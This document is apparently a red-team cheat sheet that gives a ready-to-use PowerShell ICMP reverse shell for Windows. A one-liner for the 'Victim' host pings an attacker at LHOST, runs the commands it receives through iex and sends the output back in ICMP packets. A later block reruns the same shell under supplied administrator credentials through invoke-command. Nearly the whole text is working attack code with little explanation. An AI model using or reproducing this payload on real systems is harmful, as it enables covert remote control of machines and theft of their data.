ICMP Shell on Windows using Powershell
----------------------

#Run commands on a remote windows host



#Get a ICMP Shell on a remote host using powershell
#If you can ping from your BlueTeam(Victim) to your RedTeam (Attacker)
#Run icmpsh_m.py (RedTeam)
#Payload to run on BlueTeam(Victim)
$ip = 'LHOST'; $id = 'UNIQUEID'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment=$true; function s($b) { $ic.Send($ip,5000,([text.encoding]::ASCII).GetBytes($b),$po) }; function p { -join($id,'[P$] ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ') }; while ($true) { $r = s(p); if (!$r.Buffer) { continue; }; $rs = ([text.encoding]::ASCII).GetString($r.Buffer);  if ($rs.Substring(0,8) -ne $id) { exit }; try { $rt = (iex -Command $rs.Substring(8) | Out-String); } catch { $rt = ($_.Exception|out-string) }; $i=0; while ($i -lt $rt.length-110) { s(-join($id,$rt.Substring($i,110))); $i -= -110; }; s(-join($id,$rt.Substring($i))); }



#Execute command as user
#Change to reflect credentials 
$user = '.\administrator'; $passwd = '1234test'; $secpswd = ConvertTo-SecureString $passwd -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $user, $secpswd; invoke-command -computername localhost -credential $credential -scriptblock { COMMANDS }



#Change Credentials to user
#Change to reflect credentials 
$user = '.\administrator'; $passwd = '1234test'; $secpswd = ConvertTo-SecureString $passwd -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $user, $secpswd; invoke-command -computername localhost -credential $credential -scriptblock { $ip = 'LHOST'; $id = 'UNIQUEID'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment=$true; function s($b) { $ic.Send($ip,5000,([text.encoding]::ASCII).GetBytes($b),$po) }; function p { -join($id,'[P$] ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ') }; while ($true) { $r = s(p); if (!$r.Buffer) { continue; }; $rs = ([text.encoding]::ASCII).GetString($r.Buffer);  if ($rs.Substring(0,8) -ne $id) { exit }; try { $rt = (iex -Command $rs.Substring(8) | Out-String); } catch { $rt = ($_.Exception|out-string) }; $i=0; while ($i -lt $rt.length-110) { s(-join($id,$rt.Substring($i,110))); $i -= -110; }; s(-join($id,$rt.Substring($i))); } }


